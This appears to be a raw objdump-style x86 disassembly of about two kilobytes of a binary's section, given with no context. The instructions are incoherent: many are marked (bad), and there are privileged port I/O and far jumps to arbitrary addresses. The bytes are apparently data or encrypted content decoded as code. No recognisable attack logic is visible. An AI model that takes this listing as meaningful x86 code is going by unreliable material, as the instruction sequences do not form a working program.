  40830b:	dec    esi
  40830c:	mov    al,0x1f
  40830e:	add    al,0xd8
  408310:	push   edx
  408311:	adc    eax,DWORD PTR [esi+ebx*4-0x4a00bd82]
  408318:	nop
  408319:	scas   al,BYTE PTR es:[edi]
  40831a:	(bad)
  40831d:	or     al,0x2e
  40831f:	out    0x61,al
  408321:	jbe    0x408397
  408323:	(bad)  
  408324:	cmp    al,0x26
  408326:	fsubp  st(2),st
  408328:	popf   
  408329:	lock ret 0x7496
  40832d:	inc    esi
  40832e:	jg     0x408311
  408330:	imul   ebx,DWORD PTR [edi],0xffffffd0
  408333:	pop    eax
  408334:	nop
  408335:	in     eax,0x75
  408337:	int3   
  408338:	push   edi
  408339:	gs out dx,al
  40833b:	shl    ah,cl
  40833d:	out    0x94,eax
  40833f:	scas   al,BYTE PTR es:[edi]
  408340:	pop    eax
  408341:	shl    BYTE PTR [eax+edx*8-0x6929234f],0xb8
  408349:	setns  BYTE PTR [edi+0x4f]
  40834d:	cwde   
  40834e:	inc    edi
  40834f:	retf   0x5c9c
  408352:	leave  
  408353:	(bad)  
  408354:	push   edi
  408355:	xchg   ebp,eax
  408356:	sahf   
  408357:	mov    ds:0x155a354f,al
  40835c:	call   0x16d4:0x9a11a078
  408363:	push   edi
  408364:	mov    bh,0x81
  408366:	jge    0x4083a4
  408368:	pop    ebp
  408369:	(bad)  
  40836a:	jmp    0x268dc9c4
  40836f:	jle    0x408393
  408371:	mov    DWORD PTR [esi],0xb17be800
  408377:	jmp    FWORD PTR [esi+0x55]
  40837a:	or     DWORD PTR [esi],eax
  40837c:	xlat   BYTE PTR ds:[ebx]
  40837d:	jnp    0x408307
  40837f:	into   
  408380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408381:	ror    BYTE PTR [edi-0x3f1bb7ab],1
  408387:	jg     0x40833c
  408389:	or     BYTE PTR [edx+edi*4+0x375c90a4],0x91
  408391:	mov    eax,0xd162eb46
  408396:	es push es
  408398:	sti    
  408399:	inc    edx
  40839a:	sbb    bl,BYTE PTR ds:0xfb6a942f
  4083a0:	aad    0xfa
  4083a2:	mov    ebx,0x4f3cf41e
  4083a7:	or     BYTE PTR [ebx+0x15],bl
  4083aa:	ret    
  4083ab:	add    ch,BYTE PTR [edx-0x2d2b7511]
  4083b1:	sub    eax,0x2696f441
  4083b6:	pop    esp
  4083b7:	jmp    0x456d6c8f
  4083bc:	daa    
  4083bd:	xlat   BYTE PTR ds:[ebx]
  4083be:	mov    bl,0xb3
  4083c0:	aad    0x92
  4083c2:	inc    eax
  4083c3:	icebp  
  4083c4:	out    dx,eax
  4083c5:	call   0x9c092e8b
  4083ca:	lods   eax,DWORD PTR ds:[esi]
  4083cb:	js     0x4083e0
  4083cd:	mov    ebx,edx
  4083cf:	and    ecx,eax
  4083d1:	dec    esi
  4083d2:	fwait
  4083d3:	addr16 retf 0x9c8b
  4083d7:	xchg   edi,eax
  4083d8:	addr16 jg 0x40835b
  4083db:	sub    ch,0xd5
  4083de:	xor    eax,0xcba2d856
  4083e3:	hlt    
  4083e4:	and    DWORD PTR [edx+0x60],ebx
  4083e7:	mov    cl,BYTE PTR [ebx-0x53]
  4083ea:	dec    eax
  4083eb:	shl    BYTE PTR [edi-0x4fa97268],0xee
  4083f2:	add    DWORD PTR [ecx],0x1a051bf9
  4083f8:	sbb    esi,DWORD PTR [eax]
  4083fa:	jae    0x40841c
  4083fc:	xchg   esp,eax
  4083fd:	inc    ebx
  4083fe:	in     al,dx
  4083ff:	stos   BYTE PTR es:[edi],al
  408400:	push   edi
  408401:	lds    ecx,FWORD PTR [ebp-0x24]
  408404:	push   0x597d62ba
  408409:	in     al,dx
  40840a:	int3   
  40840b:	xor    ebp,DWORD PTR [esi+ebx*2]
  40840e:	cmp    al,0xa
  408410:	sbb    BYTE PTR [eax-0x78685dc6],dl
  408416:	mov    al,ds:0x473b5515
  40841b:	ror    BYTE PTR [esi],0x63
  40841e:	mov    bh,0x0
  408420:	adc    BYTE PTR [ecx+0x33],dh
  408423:	(bad)  
  408424:	sub    edi,ecx
  408426:	icebp  
  408427:	stc    
  408428:	jle    0x40842a
  40842a:	mov    edi,DWORD PTR [ebp-0x1ce17167]
  408430:	mov    edi,0x2c2cc4d5
  408435:	sahf   
  408436:	outs   dx,DWORD PTR ds:[esi]
  408437:	std    
  408438:	lea    eax,[edi]
  40843a:	dec    eax
  40843b:	into   
  40843c:	jae    0x408408
  40843e:	inc    ebx
  40843f:	jnp    0x408477
  408441:	push   0xfffffff6
  408443:	lods   al,BYTE PTR ds:[esi]
  408444:	push   cs
  408445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408446:	fisttp QWORD PTR ds:0x24e9d78e
  40844c:	mov    ch,BYTE PTR [ecx]
  40844e:	dec    ebx
  40844f:	rol    DWORD PTR [eiz*1-0x51dad61a],0x62
  408457:	into   
  408458:	cmc    
  408459:	hlt    
  40845a:	ret    0xf8d9
  40845d:	push   eax
  40845e:	std    
  40845f:	dec    edx
  408460:	int    0xd6
  408462:	xor    BYTE PTR [edi*4-0x19d98c5d],al
  408469:	mov    esi,0x519ea83f
  40846e:	adc    eax,0xf119ff9
  408473:	and    esi,ebx
  408475:	das    
  408476:	or     al,0xed
  408478:	xchg   ebp,eax
  408479:	int3   
  40847a:	push   ebx
  40847b:	test   DWORD PTR [esi+0x342bc0a5],0xdde201e
  408485:	outs   dx,BYTE PTR ds:[esi]
  408486:	push   ebx
  408487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408488:	jmp    0x41cf9778
  40848d:	xchg   esp,eax
  40848e:	jmp    0x979e:0xb8b2388a
  408495:	(bad)  
  408496:	cmp    ah,BYTE PTR [esi+0x6a]
  408499:	xlat   BYTE PTR ds:[ebx]
  40849a:	cs push edi
  40849c:	out    0xf6,al
  40849e:	inc    esi
  40849f:	mov    al,0x18
  4084a1:	xor    bh,BYTE PTR [ecx]
  4084a3:	dec    ebx
  4084a4:	out    0x90,eax
  4084a6:	push   0x59
  4084a8:	cdq    
  4084a9:	ficomp WORD PTR [ebx-0x2]
  4084ac:	call   0xd7cc:0x1227d445
  4084b3:	and    BYTE PTR [esi-0x66],al
  4084b6:	mov    bl,0xdc
  4084b8:	pop    ss
  4084b9:	or     DWORD PTR [esp+ecx*1-0x70],0xffffff8c
  4084be:	dec    edi
  4084bf:	dec    eax
  4084c0:	ins    DWORD PTR es:[edi],dx
  4084c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084c2:	or     eax,ecx
  4084c4:	sti    
  4084c5:	inc    eax
  4084c6:	xor    al,BYTE PTR [ebx]
  4084c8:	xor    ch,dh
  4084ca:	(bad)  
  4084cb:	sub    edi,ebp
  4084cd:	aas    
  4084ce:	push   edi
  4084cf:	or     DWORD PTR ss:[ebp+edi*1+0x37],ebx
  4084d4:	call   0xcb0c:0x5c9e0519
  4084db:	dec    ebx
  4084dc:	mov    ebp,0x7fbce96f
  4084e1:	stos   DWORD PTR es:[edi],eax
  4084e2:	jp     0x4084f6
  4084e4:	or     BYTE PTR [ecx+0x261e4964],ch
  4084ea:	push   edi
  4084eb:	push   0xcf1cb21e
  4084f0:	mov    edx,0xe14fbcb3
  4084f5:	inc    DWORD PTR ds:0x6106d144
  4084fb:	sub    DWORD PTR [ebx-0x1b],ebx
  4084fe:	mov    fs,ebx
  408500:	xchg   ecx,eax
  408501:	or     al,0xbb
  408503:	pop    esi
  408504:	fsubr  QWORD PTR [ecx-0x6400192e]
  40850a:	jecxz  0x408562
  40850c:	and    al,BYTE PTR [edi]
  40850e:	pop    edx
  40850f:	or     DWORD PTR [edx-0x66e5d658],esp
  408515:	pop    esp
  408516:	mov    DWORD PTR [ebx],ebx
  408518:	sbb    DWORD PTR [esi-0x6993fc5f],0xb7155167
  408522:	xchg   DWORD PTR [esi-0x6e2428d7],edx
  408528:	cmp    ebx,DWORD PTR [ebx]
  40852a:	retf   
  40852b:	in     eax,dx
  40852c:	and    dh,BYTE PTR [esi-0x8]
  40852f:	pop    edi
  408530:	ins    DWORD PTR es:[edi],dx
  408531:	add    DWORD PTR [esi-0x58],ecx
  408534:	mov    ah,0x4f
  408536:	fsubrp st(2),st
  408538:	scas   eax,DWORD PTR es:[edi]
  408539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40853a:	pop    ebx
  40853b:	jb     0x4084fd
  40853d:	xlat   BYTE PTR ds:[ebx]
  40853e:	mov    eax,ds:0x73108bc1
  408543:	xor    al,0xd9
  408545:	xchg   ecx,eax
  408546:	(bad)  
  408547:	adc    BYTE PTR [esi+0x6a],dh
  40854a:	pop    edx
  40854b:	fist   DWORD PTR [ebx-0xe]
  40854e:	in     eax,dx
  40854f:	rol    esp,1
  408551:	cmp    eax,0xfcc06eaf
  408556:	and    cl,BYTE PTR [edi-0x44]
  408559:	retf   
  40855a:	sbb    BYTE PTR [eax+edx*2],cl
  40855d:	xchg   ecx,eax
  40855e:	loop   0x4085b7
  408560:	outs   dx,DWORD PTR ds:[esi]
  408561:	cli    
  408562:	aaa    
  408563:	sbb    eax,edi
  408565:	not    DWORD PTR [ecx]
  408567:	pop    es
  408568:	cmp    esp,DWORD PTR [ecx+0x61ca7e50]
  40856e:	lea    edi,ds:0xaab18fc6
  408574:	test   DWORD PTR ds:0xb6bd4e14,esp
  40857a:	sbb    bl,BYTE PTR [esp+edx*4+0x6e]
  40857e:	(bad)  
  408580:	adc    dl,BYTE PTR [edx+ecx*8]
  408583:	adc    bh,BYTE PTR [eax-0x3d]
  408586:	mov    dl,0x90
  408588:	stc    
  408589:	xor    DWORD PTR [edx+ebp*1-0x47533c3f],ebx
  408590:	loop   0x408551
  408592:	sub    BYTE PTR [edi],dl
  408594:	adc    ch,BYTE PTR [eax-0x45]
  408597:	ror    BYTE PTR [esi+0x6fcbe349],1
  40859d:	iret   
  40859e:	and    BYTE PTR [esi-0x6e],bh
  4085a1:	dec    edx
  4085a2:	mov    edx,0xe90188e7
  4085a7:	dec    eax
  4085a8:	add    eax,DWORD PTR [eax]
  4085aa:	add    BYTE PTR [edi-0x6],al
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x90c77395
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x40856b
  4085c4:	sub    al,0x68
  4085c6:	push   DWORD PTR [edx-0x54334a4d]
  4085cc:	mov    esi,0x9846f32e
  4085d1:	mov    eax,ds:0x820f2b45
  4085d6:	adc    ah,dh
  4085d8:	cmp    bl,0x71
  4085db:	enter  0x39f,0x54
  4085df:	mov    edi,0xae797d70
  4085e4:	aas    
  4085e5:	es or  al,0x97
  4085e8:	dec    esi
  4085e9:	xchg   ebx,eax
  4085ea:	call   0x5a2:0xfd8a715a
  4085f1:	pop    esp
  4085f2:	mov    ah,0x2d
  4085f4:	aam    0x42
  4085f6:	imul   eax,esp,0x7760c179
  4085fc:	xchg   BYTE PTR [ebp+0x23],bh
  4085ff:	cmp    ebx,DWORD PTR [edi]
  408601:	jnp    0x4085db
  408603:	mov    edi,0x8609caf6
  408608:	mov    al,0x6c
  40860a:	mov    bl,0xff
  40860c:	aam    0xb5
  40860e:	inc    edx
  40860f:	loopne 0x40868d
  408611:	xor    dl,BYTE PTR [esi]
  408613:	jns    0x408634
  408615:	pop    eax
  408616:	sub    al,0xa7
  408618:	jb     0x40862a
  40861a:	adc    DWORD PTR [edx+edx*1],eax
  40861d:	sbb    DWORD PTR [ecx+ebx*2-0x15],0xf32d3bcd
  408625:	arpl   WORD PTR [ecx-0x56],ax
  408628:	mov    ebx,0x56c7cad1
  40862d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40862e:	mov    ds:0xb157d993,eax
  408633:	adc    BYTE PTR [edx],al
  408635:	std    
  408636:	(bad)  
  408637:	not    bh
  408639:	mov    ch,0xe6
  40863b:	dec    ebp
  40863c:	rcl    DWORD PTR [esi],0x97
  40863f:	xlat   BYTE PTR ds:[ebx]
  408640:	jmp    0xfcc40333
  408645:	iret   
  408646:	push   edx
  408647:	lods   eax,DWORD PTR ds:[esi]
  408648:	sbb    DWORD PTR [eax],0xffffffcc
  40864b:	stc    
  40864c:	call   0x7a98:0x529f383c
  408653:	inc    ebp
  408654:	cld    
  408655:	bound  eax,QWORD PTR [eax+0x30d96bfc]
  40865b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40865c:	mov    dh,0x2
  40865e:	cmp    BYTE PTR [ecx+ebp*8-0x56],al
  408662:	push   edi
  408663:	jge    0x408615
  408665:	pop    edi
  408666:	dec    ebp
  408667:	mov    cl,0x85
  408669:	push   ecx
  40866a:	and    bl,ah
  40866c:	(bad)  
  40866d:	cli    
  40866e:	mov    ch,0xbb
  408670:	jnp    0x4086e5
  408672:	jecxz  0x408669
  408674:	in     eax,0x58
  408676:	daa    
  408677:	popf   
  408678:	jno    0x4086c7
  40867a:	mov    ds:0x8ece4d56,eax
  40867f:	inc    esp
  408680:	call   DWORD PTR [esi-0x3111a99e]
  408686:	ror    DWORD PTR [eax+0xa],1
  408689:	cdq    
  40868a:	(bad)  
  40868b:	aad    0x56
  40868d:	imul   DWORD PTR [eax-0x3]
  408690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408691:	or     al,0xe5
  408693:	inc    esp
  408694:	push   ecx
  408695:	xor    ecx,DWORD PTR [eax+0x54]
  408698:	dec    esi
  408699:	and    DWORD PTR ds:0x6212217c,0xffffff81
  4086a0:	jecxz  0x40871a
  4086a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086a3:	dec    BYTE PTR [edx+ebx*1]
  4086a6:	shl    ch,0x27
  4086a9:	ret    0x9cdd
  4086ac:	push   ss
  4086ad:	mov    esi,0x5d0e87d2
  4086b2:	out    0x3f,al
  4086b4:	(bad)  
  4086b5:	dec    eax
  4086b6:	arpl   bx,bp
  4086b8:	mov    esp,0x40d3710d
  4086bd:	pop    ss
  4086be:	cli    
  4086bf:	mov    edx,0x12daa10d
  4086c4:	iret   
  4086c5:	(bad)  
  4086c6:	das    
  4086c7:	xchg   ebp,eax
  4086c8:	inc    ebp
  4086c9:	cdq    
  4086ca:	xchg   edi,eax
  4086cb:	xor    ebp,esi
  4086cd:	sbb    BYTE PTR [edx],bh
  4086cf:	adc    BYTE PTR [ebp-0x56],0xbd
  4086d3:	mov    ecx,DWORD PTR [edi-0x42f5db67]
  4086d9:	mov    ecx,eax
  4086db:	cdq    
  4086dc:	out    dx,eax
  4086dd:	(bad)  
  4086df:	cli    
  4086e0:	js     0x408719
  4086e2:	das    
  4086e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086e4:	inc    esp
  4086e5:	shr    BYTE PTR [eax*1+0x7af0a98b],cl
  4086ec:	into   
  4086ed:	jl     0x408750
  4086ef:	std    
  4086f0:	pop    edx
  4086f1:	xchg   ecx,eax
  4086f2:	pop    ecx
  4086f3:	and    dl,BYTE PTR [edi]
  4086f5:	aam    0x13
  4086f7:	jp     0x408706
  4086f9:	aad    0x9c
  4086fb:	lds    eax,FWORD PTR [esi-0x4d]
  4086fe:	sub    eax,0x7e47822e
  408703:	rol    DWORD PTR [ebx],1
  408705:	addr16 popfw 
  408708:	jecxz  0x4086df
  40870a:	xchg   esp,eax
  40870b:	jecxz  0x40875e
  40870d:	push   edx
  40870e:	pop    eax
  40870f:	add    DWORD PTR [edi-0x58d9df90],edi
  408715:	add    BYTE PTR [eax+0x52],ch
  408718:	sbb    DWORD PTR [edi],0x2f653301
  40871e:	dec    BYTE PTR ds:0x8f424cf8
  408724:	leave  
  408725:	inc    esp
  408726:	icebp  
  408727:	push   0xf8e5b522
  40872c:	jb     0x4086d7
  40872e:	mov    esi,0x23d29708
  408733:	xchg   ebp,eax
  408734:	xchg   ebx,eax
  408735:	inc    edx
  408736:	sub    DWORD PTR ds:0xba46b1e3,ecx
  40873c:	push   edi
  40873d:	es mov esp,0xa3dbac25
  408743:	or     eax,0xc27062df
  408748:	add    eax,0xeb738147
  40874d:	and    dl,BYTE PTR [esi]
  40874f:	push   ebx
  408750:	jmp    0x409a95fb
  408755:	cdq    
  408756:	arpl   WORD PTR [edx-0x5b8c8940],bp
  40875c:	push   eax
  40875d:	(bad)  
  40875e:	fild   QWORD PTR [ecx+0x7545eb1c]
  408764:	sbb    DWORD PTR ds:0xa7d40d0f,esi
  40876a:	and    esi,DWORD PTR [edi]
  40876c:	loopne 0x40877e
  40876e:	cmp    DWORD PTR [edx],ebp
  408770:	mov    cl,0x1b
  408772:	cmp    BYTE PTR [edx-0x1b5c7acc],0xb6
  408779:	aad    0x7d
  40877b:	jns    0x40870f
  40877d:	into   
  40877e:	(bad)  
  40877f:	dec    esp
  408780:	mov    ecx,0x9067754
  408785:	xor    al,0x76
  408787:	fs cld 
  408789:	adc    edi,DWORD PTR [ebp+0x55]
  40878c:	pop    edi
  40878d:	cdq    
  40878e:	mov    dl,0xd
  408790:	cmp    ebx,edi
  408792:	adc    al,ah
  408794:	lea    eax,[edi+0x675227fc]
  40879a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40879b:	mov    ch,0x32
  40879d:	lds    esp,FWORD PTR [ebx]
  40879f:	(bad)  
  4087a0:	and    dh,al
  4087a2:	inc    esp
  4087a3:	test   BYTE PTR [edx],ch
  4087a5:	aad    0x8a
  4087a7:	(bad)  
  4087a8:	fdiv   st(0),st
  4087aa:	adc    ch,BYTE PTR [ebx+0x676015e]
  4087b0:	push   cs
  4087b1:	in     al,dx
  4087b2:	clc    
  4087b3:	lock lock (bad) 
  4087b6:	in     eax,dx
  4087b7:	jecxz  0x4087fa
  4087b9:	lods   eax,DWORD PTR ds:[esi]
  4087ba:	mov    ebx,0x89b1789a
  4087bf:	jmp    0x1f6758a2
  4087c4:	out    dx,al
  4087c5:	adc    esp,DWORD PTR [edi+0x2]
  4087c8:	sub    BYTE PTR [esp+edx*8],dh
  4087cb:	push   ss
  4087cc:	out    dx,al
  4087cd:	mov    al,ds:0x55f42574
  4087d2:	inc    edi
  4087d3:	lock add eax,0xb1d0f48c
  4087d9:	fwait
  4087da:	lahf   
  4087db:	hlt    
  4087dc:	lahf   
  4087dd:	add    edi,DWORD PTR [esi-0x5fb4225a]
  4087e3:	or     eax,0x948a8b46
  4087e8:	cli    
  4087e9:	mov    ah,0xfc
  4087eb:	cli    
  4087ec:	pushf  
  4087ed:	mov    DWORD PTR [ebp-0x28],eax
  4087f0:	add    edx,eax
  4087f2:	pop    esi
  4087f3:	repnz imul bh
  4087f6:	cmp    BYTE PTR [esi+ecx*1+0x55ee35e5],0x42
  4087fe:	inc    esp
  4087ff:	lahf   
  408800:	adc    dl,BYTE PTR [ecx]
  408802:	xor    BYTE PTR [ebp+0x68095da8],bl
  408808:	pop    esi
  408809:	dec    ecx
  40880a:	lea    ebx,ss:[ebx+0x8257f77]
  408811:	scas   al,BYTE PTR es:[edi]
  408812:	xchg   ebp,eax
  408813:	pop    ds
  408814:	out    0x1d,al
  408816:	cmp    BYTE PTR [eax-0x1d],dh
  408819:	lds    esp,FWORD PTR [edi+ecx*4+0x26]
  40881d:	inc    ebp
  40881e:	das    
  40881f:	int    0xb1
  408821:	test   eax,0xe25e8fa
  408826:	jmp    0x5f84:0x4d394438
  40882d:	aas    
  40882e:	push   edi
  40882f:	jg     0x408840
  408831:	adc    BYTE PTR [ebx],0xbb
  408834:	retf   
  408835:	inc    edx
  408836:	aad    0x55
  408838:	jmp    0x4087fb
  40883a:	fwait
  40883b:	pusha  
  40883c:	inc    ebx
  40883d:	cmp    ch,BYTE PTR [ebx-0x79]
  408840:	loop   0x408883
  408842:	dec    ecx
  408843:	mov    bh,0x8a
  408845:	sti    
  408846:	or     al,0xd4
  408848:	test   al,0x82
  40884b:	(bad)  
  40884c:	or     BYTE PTR [esi],bl
  40884e:	mov    esi,0x1090a8e2
  408853:	mov    ebp,0x8edb125f
  408858:	icebp  
  408859:	xchg   esi,eax
  40885a:	lock xor al,0xe8
  40885d:	test   DWORD PTR [ecx+0x3c],esi
  408860:	cmp    eax,0x7b28a925
  408865:	mov    esp,0xfd52ace0
  40886a:	ret    0x52b9
  40886d:	daa    
  40886e:	scas   al,BYTE PTR es:[edi]
  40886f:	imul   ecx,esp,0x2aa52d0c
  408875:	lds    ebx,FWORD PTR [ebp-0x18ea03d8]
  40887b:	push   edi
  40887c:	pop    ebx
  40887d:	jo     0x4088e1
  40887f:	add    DWORD PTR [esi-0x57f3b666],ebx
  408885:	xor    eax,0xd28dac9f
  40888a:	stos   BYTE PTR es:[edi],al
  40888b:	scas   al,BYTE PTR es:[edi]
  40888c:	adc    ah,BYTE PTR [ecx-0x13]
  40888f:	bound  esp,QWORD PTR [edi+edi*8+0x3688596d]
  408896:	mov    eax,0x61a623de
  40889b:	ret    0xfcbf
  40889e:	push   edi
  40889f:	ficomp WORD PTR [esi]
  4088a1:	fprem  
  4088a3:	stos   BYTE PTR es:[edi],al
  4088a4:	add    eax,0x87d3828f
  4088a9:	sbb    ebx,DWORD PTR [eax]
  4088ab:	jo     0x408838
  4088ad:	(bad)  
  4088ae:	rol    ebp,cl
  4088b0:	mov    al,ds:0xd76a10c2
  4088b5:	inc    ebx
  4088b6:	xchg   ebp,eax
  4088b7:	or     eax,0x41a53e78
  4088bc:	jnp    0x4088f8
  4088be:	imul   edx,DWORD PTR [edi+0x4a600c5b],0x13f9573b
  4088c8:	iret   
  4088c9:	sub    al,0x23
  4088cb:	test   bh,dl
  4088cd:	or     eax,0xb5fc91f4
  4088d2:	es push 0x960ba8bf
  4088d8:	sbb    eax,0x236482f0
  4088dd:	ss push ebp
  4088df:	jmp    0xdf29:0x7beae43d
  4088e6:	pop    es
  4088e7:	mov    BYTE PTR [eax+0x45],bl
  4088ea:	mov    edx,esi
  4088ec:	jno    0x4088f3
  4088ee:	xchg   esp,eax
  4088ef:	lea    edi,[ecx+0x39]
  4088f2:	out    0x8d,eax
  4088f4:	inc    ebp
  4088f5:	clc    
  4088f6:	inc    BYTE PTR [eax]
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x26435cff],cl
  40890c:	push   0xdc97921f
  408911:	jo     0x408983
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408919
  408918:	jmp    0x408922
  40891a:	xchg   edi,eax
  40891b:	call   FWORD PTR ds:0x4986ec95
  408921:	js     0x4088c8
  408923:	fnstcw WORD PTR [ebx+0x5a8bbb0]
  408929:	retf   
  40892a:	adc    eax,0x616616e3
  40892f:	sub    DWORD PTR [edx-0x42a6b086],0xffffffdc
  408936:	retf   0x2dc4
  408939:	xor    BYTE PTR [edx-0x6cf17c3e],bl
  40893f:	fiadd  WORD PTR [edi+0x5d]
  408942:	sti    
  408943:	sbb    BYTE PTR [ecx+edx*1+0x7a64c03c],bh
  40894a:	pop    esi
  40894b:	mov    edx,0xab474130
  408950:	loopne 0x40898c
  408952:	add    BYTE PTR ds:0x6e5a2d71,ah
  408958:	rcr    DWORD PTR [edi],0xed
  40895b:	xchg   ebx,eax
  40895c:	jmp    0xc4ff:0xde6ebf26
  408963:	test   BYTE PTR [eax],0x5e
  408966:	push   0x4f
  408968:	jl     0x408931
  40896a:	cdq    
  40896b:	loop   0x4089d4
  40896d:	mov    edi,0x8c3973a2
  408972:	cwde   
  408973:	iret   
  408974:	push   ss
  408975:	into   
  408976:	mov    ds:0x92d646b9,al
  40897b:	mov    WORD PTR [edi-0x33],?
  40897e:	push   ecx
  40897f:	addr16 sbb eax,0x320941d5
  408985:	fild   QWORD PTR [esi-0x5643cb0b]
  40898b:	out    0x66,al
  40898d:	aas    
  40898e:	inc    eax
  40898f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408990:	jno    0x408954
  408992:	xchg   cx,ax
  408994:	loopne 0x40899f
  408996:	lea    esi,[eax+0x68f5db5a]
  40899c:	shr    DWORD PTR [edi+0x4],1
  40899f:	push   ax
  4089a1:	aaa    
  4089a2:	(bad)  
  4089a3:	jb     0x408a01
  4089a5:	pop    esi
  4089a6:	bound  ecx,QWORD PTR [eax]
  4089a8:	fmul   DWORD PTR [ebx]
  4089aa:	mov    ds:0xb44f7022,al
  4089af:	mov    WORD PTR [eax],?
  4089b1:	and    al,0x27
  4089b3:	push   es
  4089b4:	(bad)  
  4089b5:	std    
  4089b6:	sub    ecx,DWORD PTR [eax+0x16]
  4089b9:	ins    BYTE PTR es:[edi],dx
  4089ba:	push   esi
  4089bb:	adc    DWORD PTR [eax],esi
  4089bd:	add    dh,BYTE PTR [edx]
  4089bf:	cmp    al,0xae
  4089c1:	sub    eax,DWORD PTR [ebx+esi*1+0x5d]
  4089c5:	pop    esp
  4089c6:	mov    eax,gs:0x9bc07fab
  4089cc:	dec    esi
  4089cd:	ret    0x3171
  4089d0:	test   bh,bh
  4089d2:	pop    ebp
  4089d3:	xor    BYTE PTR [esp+edi*1+0x6],ch
  4089d7:	dec    ecx
  4089d8:	add    edx,DWORD PTR [ecx]
  4089da:	xchg   edx,eax
  4089db:	stos   BYTE PTR es:[edi],al
  4089dc:	addr16 xchg esp,eax
  4089de:	adc    DWORD PTR [esi],ebp
  4089e0:	xchg   edx,eax
  4089e1:	in     eax,dx
  4089e2:	mov    esp,0x140284b4
  4089e7:	sbb    BYTE PTR [eax+0x5c5cdec3],0xbb
  4089ee:	xor    ch,cl
  4089f0:	mov    eax,ds:0x4d2f56c7
  4089f5:	dec    edi
  4089f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089f7:	and    dl,BYTE PTR [edx-0xe276bc8]
  4089fd:	iret   
  4089fe:	add    BYTE PTR [ecx],ch
  408a00:	ss xchg edi,eax
  408a02:	rcl    BYTE PTR [edi],cl
  408a04:	push   eax
  408a05:	adc    DWORD PTR [ebx+0x2969db9d],ecx
  408a0b:	add    al,0xa
  408a0d:	cli    
  408a0e:	pop    ss
  408a0f:	fldcw  WORD PTR [ebx-0x2d6beaad]
  408a15:	call   0xfff1:0xcc6ca33d
  408a1c:	mov    eax,0x787dd8ef
  408a21:	jge    0x408a74
  408a23:	enter  0xb064,0x3c
  408a27:	aam    0x66
  408a29:	iret   
  408a2a:	inc    edx
  408a2b:	in     eax,dx
  408a2c:	scas   al,BYTE PTR es:[edi]
  408a2d:	(bad)  
  408a2e:	fbld   TBYTE PTR [eax]
  408a30:	out    dx,eax
  408a31:	aad    0x6e
  408a33:	jmp    0xcc820796
  408a38:	hlt    
  408a39:	mov    ah,0x41
  408a3b:	ficomp WORD PTR [esi]
  408a3d:	xor    al,0xc0
  408a3f:	mov    ch,0xa1
  408a41:	jecxz  0x408a54
  408a43:	inc    esp
  408a44:	pop    ecx
  408a45:	lds    si,DWORD PTR [edi+0x2e0b20a5]
  408a4c:	and    eax,0x857bcfbc
  408a51:	sahf   
  408a52:	cmp    BYTE PTR [ebx],ch
  408a54:	pop    esp
  408a55:	arpl   WORD PTR [edi],di
  408a57:	sub    BYTE PTR [ecx],dl
  408a59:	retf   0x91a4
  408a5c:	push   0xffffffd3
  408a5e:	mul    DWORD PTR [ebx]
  408a60:	sub    bh,BYTE PTR [ebp+ecx*1-0x42]
  408a64:	push   ebx
  408a65:	pushf  
  408a66:	icebp  
  408a67:	pop    ss
  408a68:	push   esp
  408a69:	add    eax,0xc5e22d1c
  408a6e:	mov    dl,0x16
  408a70:	adc    al,0x83
  408a72:	(bad)
  408a75:	add    DWORD PTR gs:0xdaec9317,ebp
  408a7c:	cld    
  408a7d:	pop    DWORD PTR [ebx+0x6ed70898]
  408a83:	std    
  408a84:	mov    al,ds:0x72d4b693
  408a89:	sbb    eax,0xb483dda3
  408a8e:	add    ah,al
  408a90:	cdq    
  408a91:	inc    eax
  408a92:	das    
  408a93:	cmp    dh,BYTE PTR [ebx+0x692fe0dc]
  408a99:	lods   eax,DWORD PTR es:[esi]
  408a9b:	mov    ds:0xefa4e54b,al
  408aa0:	jo     0x408ae1
  408aa2:	pop    ecx
  408aa3:	out    dx,eax
  408aa4:	scas   eax,DWORD PTR es:[edi]
  408aa5:	stc    
  408aa6:	sbb    esi,DWORD PTR [ebx-0x1e251a41]
  408aac:	fcmovnb st,st(2)
  408aae:	mov    eax,0xea57e8dc
  408ab3:	scas   eax,DWORD PTR es:[edi]
  408ab4:	or     cl,dh
  408ab6:	aaa    
  408ab7:	loopne 0x408ad0
  408ab9:	xchg   esp,eax
  408aba:	fwait
  408abb:	or     DWORD PTR [eax-0x6e],esp
  408abe:	cmp    eax,0x4c50e392
  408ac3:	mov    ebp,?
  408ac5:	dec    edi
  408ac6:	mov    ds:0xe001065c,eax
  408acb:	das    
  408acc:	jb     0x408a9d
  408ace:	mov    ah,0x8c
  408ad0:	mov    al,0xf9
  408ad2:	xchg   edi,eax
  408ad3:	fimul  DWORD PTR ds:0x1dfbc3c9
  408ad9:	test   al,0x61
  408adb:	repnz fs (bad) 
  408ade:	js     0x408a71
  408ae0:	ror    al,cl
  408ae2:	inc    edi
  408ae3:	push   edi
  408ae4:	out    dx,al
  408ae5:	add    edx,edx
  408ae7:	sub    al,0x37
  408ae9:	push   ebx
  408aea:	adc    DWORD PTR [edx+0x2cddff8b],0xfffffff1
  408af1:	mov    DWORD PTR [ecx+0x4b],esp
  408af4:	lock and al,0xad
  408af7:	out    dx,eax
  408af8:	push   cs
